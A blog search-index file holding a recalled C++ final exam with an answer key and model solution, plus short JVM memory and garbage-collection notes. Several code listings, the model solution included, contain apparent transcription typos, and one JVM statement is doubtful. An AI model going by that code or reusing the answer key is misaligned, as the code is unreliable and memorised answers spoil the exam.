<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>C++高级程序设计2024 期末回忆</title>
    <url>/2025/01/04/C++%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A12024%E6%9C%9F%E6%9C%AB%E5%9B%9E%E5%BF%86/</url>
    <content><![CDATA[<h3 id="一-简答题（共12题，每题5分，共60分）"><a href="#一-简答题（共12题，每题5分，共60分）" class="headerlink" title="一 简答题（共12题，每题5分，共60分）"></a>一 简答题（共12题，每题5分，共60分）</h3><h4 id="1-解释C-内存管理的机制，并说明栈、堆、静态存储区的区别。"><a href="#1-解释C-内存管理的机制，并说明栈、堆、静态存储区的区别。" class="headerlink" title="1. 解释C++内存管理的机制，并说明栈、堆、静态存储区的区别。"></a>1. 解释C++内存管理的机制，并说明栈、堆、静态存储区的区别。</h4><p>答：C++中的内存管理分为栈、堆和静态存储区: 栈用于存储局部变量，由编译器自动分配和释放，生命周期短，访问快；堆用于动态分配内存，由程序员手动管理，适合大块数据，生命周期由程序控制；静态存储区存储全局变量和静态变量，整个程序生命周期内有效，访问速度与栈相当。</p>
<h4 id="2-简要解释指针和数组的关系，并说明如何通过指针操作数组元素。"><a href="#2-简要解释指针和数组的关系，并说明如何通过指针操作数组元素。" class="headerlink" title="2. 简要解释指针和数组的关系，并说明如何通过指针操作数组元素。"></a>2. 简要解释指针和数组的关系，并说明如何通过指针操作数组元素。</h4><p>答：数组名相当于指向其首元素的指针。通过指针偏移可以访问数组元素，使用*(指针+偏移量)解引用操作具体的元素。</p>
<h4 id="3-虚函数是如何支持多态性的？虚函数被调用时，如何确保正确的函数被调用？"><a href="#3-虚函数是如何支持多态性的？虚函数被调用时，如何确保正确的函数被调用？" class="headerlink" title="3. 虚函数是如何支持多态性的？虚函数被调用时，如何确保正确的函数被调用？"></a>3. 虚函数是如何支持多态性的？虚函数被调用时，如何确保正确的函数被调用？</h4><p>答：虚函数通过动态绑定支持多态性。当基类指针或引用指向派生类对象时，调用虚函数时由虚函数表和虚表指针机制决定具体调用哪个函数。每个类有一个虚函数表，记录函数地址，派生类会覆盖基类的对应入口。调用虚函数时，通过对象的虚表指针定位到正确的函数地址，确保调用派生类的实现。</p>
<span id="more"></span>

<h4 id="4-隐式类型转换和显示类型转换（强制转换）的区别？"><a href="#4-隐式类型转换和显示类型转换（强制转换）的区别？" class="headerlink" title="4. 隐式类型转换和显示类型转换（强制转换）的区别？"></a>4. 隐式类型转换和显示类型转换（强制转换）的区别？</h4><p>答：隐式类型转换由编译器自动完成，适用于兼容类型，但可能引发精度丢失或逻辑错误;显式类型转换由程序员通过特定语法主动指定，提供更高的控制权，但需要自行确保转换合理性。</p>
<h4 id="5-什么是RAII原则？举例说明RAII如何在C-中实现资源管理，并解释这一原则如何帮助简化异常安全的编程。"><a href="#5-什么是RAII原则？举例说明RAII如何在C-中实现资源管理，并解释这一原则如何帮助简化异常安全的编程。" class="headerlink" title="5. 什么是RAII原则？举例说明RAII如何在C++中实现资源管理，并解释这一原则如何帮助简化异常安全的编程。"></a>5. 什么是RAII原则？举例说明RAII如何在C++中实现资源管理，并解释这一原则如何帮助简化异常安全的编程。</h4><p>答:RAIl(ResourceAcquisitionIsInitialization，资源获取即初始化)原则指资源的获取和释放与对象的生命周期绑定。通过构造函数获取资源，析构函数释放资源。RAII在异常发生时通过自动调用析构函数释放资源，避免资源泄漏，从而简化异常安全的编程。</p>
<h4 id="6-什么是对象切片？给出一个对象切片实例，说明产生的原因及解决办法。"><a href="#6-什么是对象切片？给出一个对象切片实例，说明产生的原因及解决办法。" class="headerlink" title="6. 什么是对象切片？给出一个对象切片实例，说明产生的原因及解决办法。"></a>6. 什么是对象切片？给出一个对象切片实例，说明产生的原因及解决办法。</h4><p>答：对象切片是指将派生类对象赋值给基类对象时，派生类特有的成员和行为被“切掉“只保密基类部分。其原因是赋值操作按值拷贝，只处理基类部分。解决方法是使用基类指针或引用代替按值传递。</p>
<h4 id="7-内联函数和宏的区别？内联函数的优点和缺点？"><a href="#7-内联函数和宏的区别？内联函数的优点和缺点？" class="headerlink" title="7. 内联函数和宏的区别？内联函数的优点和缺点？"></a>7. 内联函数和宏的区别？内联函数的优点和缺点？</h4><p>答：内联函数由编译器处理，提供类型检查和调试支持，而宏由预处理器展开，不进行类型检查。内联函数的优点是提高运行效率和增强安全性，但缺点是可能导致代码膨胀和编译时间增加。</p>
<h4 id="8-解释拷贝构造函数与移动构造函数的作用与区别。在什么情况下调用拷贝构造函数而非移动构造函数？"><a href="#8-解释拷贝构造函数与移动构造函数的作用与区别。在什么情况下调用拷贝构造函数而非移动构造函数？" class="headerlink" title="8. 解释拷贝构造函数与移动构造函数的作用与区别。在什么情况下调用拷贝构造函数而非移动构造函数？"></a>8. 解释拷贝构造函数与移动构造函数的作用与区别。在什么情况下调用拷贝构造函数而非移动构造函数？</h4><p>答：拷贝构造函数通过深拷贝创建对象副本，移动构造函数通过转移资源避免深拷贝以提升性能。当源对象无法被修改(如const对象)或不支持移动语义时，会调用拷贝构造函数而非移动构造函数。</p>
<h4 id="9-C-如何解决多重继承中的“菱形继承”问题？"><a href="#9-C-如何解决多重继承中的“菱形继承”问题？" class="headerlink" title="9. C++如何解决多重继承中的“菱形继承”问题？"></a>9. C++如何解决多重继承中的“菱形继承”问题？</h4><p>答：C++通过虚拟继承解决“菱形继承”中基类重复的问题。使用virtual关键字声明继承关系，确保派生类共享基类的唯一实例，从而避免重复定义和访问冲突。</p>
<h4 id="10-解释构造函数中成员初始化列表的作用。与构造函数体内的赋值语句相比，成员初始化列表的优势是什么？"><a href="#10-解释构造函数中成员初始化列表的作用。与构造函数体内的赋值语句相比，成员初始化列表的优势是什么？" class="headerlink" title="10. 解释构造函数中成员初始化列表的作用。与构造函数体内的赋值语句相比，成员初始化列表的优势是什么？"></a>10. 解释构造函数中成员初始化列表的作用。与构造函数体内的赋值语句相比，成员初始化列表的优势是什么？</h4><p>答：成员初始化列表用于在对象构造时直接初始化成员变量。相比于构造函数体内的赋值语句，它避免了默认构造后再赋值的额外开销，且必须用于const成员、引用成员或没有默认构造函数的成员变量。</p>
<h4 id="11-解释constexpr关键字的作用以及与传统常量const的区别。"><a href="#11-解释constexpr关键字的作用以及与传统常量const的区别。" class="headerlink" title="11. 解释constexpr关键字的作用以及与传统常量const的区别。"></a>11. 解释constexpr关键字的作用以及与传统常量const的区别。</h4><p>答：constexpr用于定义在编译期即可确定值的常量，与const相比，constexpr保证了表达式在编译期求值，支持常量表达式的优化；而const只保证值不可修改，但不强制编译期求值。</p>
<h4 id="12-比较Lambda函数与函数对象的异同。"><a href="#12-比较Lambda函数与函数对象的异同。" class="headerlink" title="12. 比较Lambda函数与函数对象的异同。"></a>12. 比较Lambda函数与函数对象的异同。</h4><p>答：Lambda函数和函数对象都可以表示可调用对象，但Lambda 函数是轻量级的匿名函数，定义更简洁；函数对象是通过类重载operator()实现，适合复杂逻辑。Lambda函数支持直接捕获变量。</p>
<h3 id="程序理解题（共10题，每题3分，共30分）"><a href="#程序理解题（共10题，每题3分，共30分）" class="headerlink" title="程序理解题（共10题，每题3分，共30分）"></a>程序理解题（共10题，每题3分，共30分）</h3><p>请仔细阅读代码，并判断代码是否存在编译错误（不包含警告）。若有错误，请指出错误的代码和错误原因；若无错误，请写出代码运行结果。注意，本节所有题目的代码，均已#include&lt;iostream&gt;。</p>
<h4 id="第1题"><a href="#第1题" class="headerlink" title="第1题"></a>第1题</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">A</span>(<span class="type">int</span> x): <span class="built_in">a</span>(x)&#123;&#125;</span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">A</span>() f std::cout &lt;&lt; <span class="string">&quot;A destructor\n&quot;</span>;&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; a &lt;&lt; std::endl; &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">B</span>(<span class="type">int</span> x, <span class="type">int</span> y) : <span class="built_in">A</span>(x), <span class="built_in">b</span>(y) &#123;&#125;</span><br><span class="line">	~<span class="built_in">B</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;B destructor\n&quot;</span>;&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; b &lt;&lt; std::endl;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	A* ptr = <span class="keyword">new</span> <span class="built_in">B</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">	ptr-&gt;<span class="built_in">show</span>();</span><br><span class="line">	<span class="keyword">delete</span> ptr;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="第2题"><a href="#第2题" class="headerlink" title="第2题"></a>第2题</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b = <span class="number">10</span>)</span></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; a + b &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a, <span class="type">double</span> b = <span class="number">20.5</span>)</span></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; a + b &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">func</span>(<span class="number">5</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="第3题"><a href="#第3题" class="headerlink" title="第3题"></a>第3题</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span> <span class="params">(<span class="type">int</span>&amp;&amp; x)</span></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> a= <span class="number">10</span>;</span><br><span class="line">	<span class="built_in">f</span>(std::<span class="built_in">move</span>(a));</span><br><span class="line">	std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="第4题"><a href="#第4题" class="headerlink" title="第4题"></a>第4题</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">A</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;A&#x27;s constructor&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">	~<span class="built_in">A</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;A&#x27;s destructor&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">	A a;</span><br><span class="line">	<span class="keyword">throw</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="built_in">fun</span>();</span><br><span class="line">	&#125; <span class="built_in">catch</span> (...) &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Exception caught&quot;</span> &lt;&lt; std::endl:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="第5题"><a href="#第5题" class="headerlink" title="第5题"></a>第5题</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="type">char</span> *str = <span class="string">&quot;hello&quot;</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">	str[<span class="number">0</span>]= <span class="string">&#x27;H&#x27;</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">	std::cout &lt;&lt; str;</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">return</span> <span class="number">0</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">&#125;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="第6题"><a href="#第6题" class="headerlink" title="第6题"></a>第6题</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> x=<span class="number">10</span>,y=<span class="number">20</span>;</span><br><span class="line">	<span class="type">int</span> * <span class="type">const</span> ptr = &amp;x;</span><br><span class="line">	*ptr =y;</span><br><span class="line">	std::cout &lt;&lt; *ptr;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="第7题"><a href="#第7题" class="headerlink" title="第7题"></a>第7题</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Base</span>() &#123;std::cout &lt;&lt; <span class="string">&quot;Base constructor called&quot;</span> &lt;&lt; std::endl;&#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">Base</span>() &#123;std::cout &lt;&lt; <span class="string">&quot;Base destructor called&quot;</span> &lt;&lt; std::endl;)</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">fun</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Derived</span>() &#123;std::cout &lt;&lt; <span class="string">&quot;Derived constructor called&quot;</span> &lt;&lt; std::endl;&#125;</span><br><span class="line">	<span class="built_in">Derived</span>() &#123;std::cout &lt;&lt; <span class="string">&quot;Derived destructor called&quot;</span> &lt;&lt; std::endl;&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;std::cout &lt;&lt; <span class="string">&quot;Derived::fun called&quot;</span> &lt;&lt; std::endl;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	Derived d;</span><br><span class="line">	d.<span class="built_in">fun</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="第8题"><a href="#第8题" class="headerlink" title="第8题"></a>第8题</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ShapeErrors</span> &#123; &#125;:</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CireleError</span> : <span class="keyword">public</span> ShapeErrors &#123;&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	CireleError e,</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">cateh</span> (ShapeErrors &amp;e)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;ShapeErrors&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">cateh</span> (CireleError &amp;e)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;CireleError&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="第9题"><a href="#第9题" class="headerlink" title="第9题"></a>第9题</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">move</span><span class="params">()</span> </span>&#123;std::cout &lt;&lt; <span class="string">&quot;move&quot;</span> &lt;&lt;std::endl;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bird</span>: <span class="keyword">protected</span> Animal&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">fly</span><span class="params">()</span> </span>&#123;<span class="built_in">move</span>();std::cout &lt;&lt; <span class="string">&quot;fly&quot;</span> &lt;&lt; std::endl;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Bird b;</span><br><span class="line">    b.<span class="built_in">fly</span>();</span><br><span class="line">    b.<span class="built_in">move</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="第10题"><a href="#第10题" class="headerlink" title="第10题"></a>第10题</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vehicle</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">drive</span><span class="params">()</span> </span>&#123;std::cout &lt;&lt; <span class="string">&quot;vehicle is driving&quot;</span> &lt;&lt; std::endl;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span> : <span class="keyword">public</span> Vehicle &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">drive</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;std::cout &lt;&lt; <span class="string">&quot;Car is driving&quot;</span> &lt;&lt; std::endl;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">operate</span><span class="params">(T t)</span></span>&#123;t.<span class="built_in">drive</span>();&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Car car;</span><br><span class="line">    <span class="built_in">operate</span>&lt;Car&gt;(car);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h4><p>1.答：正确</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">B <span class="function"><span class="keyword">destructor</span></span></span><br><span class="line"><span class="function"><span class="title">A</span> <span class="title">destructor</span></span></span><br></pre></td></tr></table></figure>

<p>2.答：错误。函数 fnc 存在二义性，无法解析调用 func(5)时匹配的版本。</p>
<p>3.答：正确</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">10</span><br><span class="line">10</span><br></pre></td></tr></table></figure>

<p>4.答：正确</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">A<span class="string">&#x27;s constructor</span></span><br><span class="line"><span class="string">A&#x27;</span>s <span class="function"><span class="keyword">destructor</span></span></span><br><span class="line"><span class="function"><span class="title">Exception</span> <span class="title">caught</span></span></span><br></pre></td></tr></table></figure>

<p>5.答：错误。指针指向字符串字面量。</p>
<p>6.答：正确。20</p>
<p>7.答：错误。fun()不是const，无法override。</p>
<p>8.答：正确：ShapeErrors</p>
<p>9.答：错误。b.move()不能访问</p>
<p>10.答：正确。Car is driving</p>
<h3 id="三、编程题-共1题，共10分"><a href="#三、编程题-共1题，共10分" class="headerlink" title="三、编程题(共1题，共10分)"></a>三、编程题(共1题，共10分)</h3><h4 id="第1题-1"><a href="#第1题-1" class="headerlink" title="第1题"></a>第1题</h4><p>定义一个用于描述二维矩形的类 Rectangle2D 和三维长方体的类 Cuboid3D，要求如下:<br>Rectangle2D 类:</p>
<ol>
<li><p>包含两个整型成员变量 length 和 width ，用于描述矩形的长和宽。</p>
</li>
<li><p>重载乘法 * 运算符：将矩形的长和宽分别与给定的整数相乘，返回一个新的 Rectangle2D 对象。</p>
</li>
<li><p>重载输出流运算符 &lt;&lt; ，用于输出矩形的各个尺寸值，格式为 [Rectangle:Length&#x3D;X,Width &#x3D; Y]。</p>
</li>
</ol>
<p>Cuboid3D 类:</p>
<ol>
<li>继承自 Rectangle2D，并增加一个整型成员变量 height，用于描述长方体的高。</li>
<li>重载乘法 * 运算符：将长方体的长、宽、高分别与给定的整数相乘，返回一个新的 Cuboid3D 对象。</li>
<li>重载输出流运算符 &lt;&lt; ，用于输出长方体的各个尺寸值,格式为[Cuboid:Length&#x3D;X,Width &#x3D; Y, Height &#x3D; Z]。</li>
</ol>
<h4 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle2D</span> &#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">double</span> length, width:</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Rectangle2D</span>(<span class="type">double</span> l = <span class="number">1.</span> <span class="type">double</span> w = <span class="number">1</span>) : <span class="built_in">length</span>(l), <span class="built_in">width</span>(w)&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    Rectangle2D <span class="keyword">operator</span>*(<span class="type">int</span> multiplier) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Rectangle2D</span>(length * multiplier, width * multiplier);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">display</span><span class="params">(std::ostream&amp; out)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">		out &lt;&lt; <span class="string">&quot;Length = &quot;</span> &lt;&lt; length &lt;&lt; <span class="string">&quot;, Width = &quot;</span> &lt;&lt; width:</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cuboid3D</span> : <span class="keyword">public</span> Rectangle2D &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">double</span> height;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Cuboid3D</span>(<span class="type">double</span> l = <span class="number">1</span>, <span class="type">double</span> w = <span class="number">1.</span> <span class="type">double</span> h = <span class="number">1</span>): <span class="built_in">Rectangle2</span>(l, w), <span class="built_in">height</span>(h)&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    Cuboid3D <span class="keyword">operator</span>*(<span class="type">int</span> multiplier) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Cuboid3D</span>(length * multiplier, width * multiplier, height * multiplier);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">(std::ostream&amp; out)</span> <span class="type">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">		Rectangle2D::<span class="built_in">display</span>(out);</span><br><span class="line">		out &lt;&lt; <span class="string">&quot;, Height = &quot;</span> &lt;&lt; height;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std:;ostream&amp; out, <span class="type">const</span> Rectangle2D&amp; rect) &#123;</span><br><span class="line">	rect.<span class="built_in">display</span>(out);</span><br><span class="line">	<span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="function">Rectangle2D <span class="title">rect2D</span><span class="params">(<span class="number">4</span>, <span class="number">5</span>)</span></span>;</span><br><span class="line">	<span class="function">Cuboid3D <span class="title">cuboid3D</span><span class="params">(<span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>)</span></span>;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;Rectangle2D: &quot;</span> &lt;&lt; rect2D &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;Rectangle3D: &quot;</span> &lt;&lt; cuboid3D &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注：operator&lt;&lt;无法在每个类中重载，要在全局范围内重载，然后Rectangle2D和Cuboid3D分别重载其中的display。</p>
]]></content>
      <categories>
        <category>C++高级程序设计</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>期末复习</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM——内存区域</title>
    <url>/2025/02/01/JVM%E8%AF%A6%E8%A7%A3%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F/</url>
    <content><![CDATA[<p>线程独有：</p>
<ul>
<li><p>程序计数器</p>
</li>
<li><p>虚拟机栈，每个栈帧包含：</p>
<ul>
<li>局部变量表</li>
<li>操作数栈</li>
<li>动态链接</li>
<li>程序返回地址</li>
</ul>
</li>
<li><p>本地方法栈</p>
</li>
</ul>
<p>线程共享：</p>
<ul>
<li><p>堆</p>
</li>
<li><p>方法区：jdk1.7为永久代，在运行时数据区中；jdk1.8为元空间，在本地内存中</p>
<ul>
<li>类信息</li>
<li>JIT代码缓存</li>
<li>运行时常量池</li>
</ul>
</li>
<li><p>静态变量、字符串常量池：jdk1.6在永久代中，jdk1.7移动至堆中</p>
</li>
<li><p>直接内存：在本地内存中</p>
</li>
</ul>
<p>​	</p>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM——垃圾回收</title>
    <url>/2025/02/01/JVM%E8%AF%A6%E8%A7%A3%E2%80%94%E2%80%94%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/</url>
    <content><![CDATA[<h2 id="一-内存分配"><a href="#一-内存分配" class="headerlink" title="一 内存分配"></a>一 内存分配</h2><p>Java 堆是垃圾收集器管理的主要区域，因此也被称作 <strong>GC 堆（Garbage Collected Heap）</strong>。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250306165524985.png" alt="image-20250306165524985" style="zoom:50%;" />

<h3 id="新生代"><a href="#新生代" class="headerlink" title="新生代"></a>新生代</h3><p>大多数情况下，对象在新生代中 Eden 区分配。当 Eden 区没有足够空间进行分配时，虚拟机将发起一次 Minor GC。通过 Minor GC 之后，Eden 区中绝大部分对象会被回收，而那些无需回收的存活对象，将会进到 Survivor 的 From 区，如果 From 区不够，则直接进入 To 区。</p>
<span id="more"></span>

<h3 id="老年代"><a href="#老年代" class="headerlink" title="老年代"></a>老年代</h3><p>以下几种情况对象会进入老年代。</p>
<p>**大对象直接进入老年代。**大对象直接进入老年代的行为是由虚拟机动态决定的，它与具体使用的垃圾回收器和相关参数有关。大对象直接进入老年代是一种优化策略，旨在避免将大对象放入新生代，从而减少新生代的垃圾回收频率和成本。</p>
<p>**长期存活的对象将进入老年代。**虚拟机给每个对象定义了一个对象年龄（Age）计数器。对象在 Survivor 中每熬过一次 MinorGC,年龄就增加 1 岁，当它的年龄增加到一定程度（默认为 15 岁，最大也为15，因为Age是4位），就会被晋升到老年代中。</p>
